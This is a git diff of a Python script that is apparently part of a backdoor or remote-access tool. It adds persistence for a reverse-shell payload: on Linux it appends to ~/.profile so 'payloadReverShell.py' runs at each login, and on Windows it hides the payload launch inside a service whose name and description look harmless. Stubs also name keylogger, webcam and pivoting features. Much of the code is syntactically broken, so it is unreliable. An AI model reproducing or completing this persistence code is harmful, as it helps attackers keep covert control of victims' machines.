@@ -46,6 +46,12 @@ finally:
     import base64
 
 
+"""
+
+from pathlib import Path
+from SMWinservice import SMWinservice
+"""
+
 
 
 message = str()
@@ -104,10 +110,36 @@ def persistant():
     if os == 1
         os.walk('~/.profile')
         createProgramme()
-        cmd = "echo  \n "if [ -r payloadReverShell\.py] ; then" \n \v "python3 payloadReverShell\.py" \n "fi"  >> ~/.profile "
+        cmd = "echo  \n 'if [ -r payloadReverShell\.py] ; then' \n \v 'python3 payloadReverShell\.py' \n 'fi'  >> ~/.profile "
     elif os == 2
 
-    return
+        os.walk()
+
+
+        class PythonCornerExample(SMWinservice):
+            _svc_name_ = "PythonCornerExample"
+            _svc_display_name_ = "Python Corner's Winservice Example"
+            _svc_description_ = "That's a great winservice! :)"
+
+            def start(self):
+                self.isrunning = True
+
+            def stop(self):
+                self.isrunning = False
+
+            def main(self):
+                self.isrunning:
+                os.walk()
+                startpayload = "python payloadReverShell.py"
+                process = subprocess.Popen(startpayload, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+
+
+            if __name__ == '__main__':
+                PythonCornerExample.parse_command_line()
+
+
+
+            return
 ##def  Keylogger():
 ##def webcam():
 ##def pivoting():
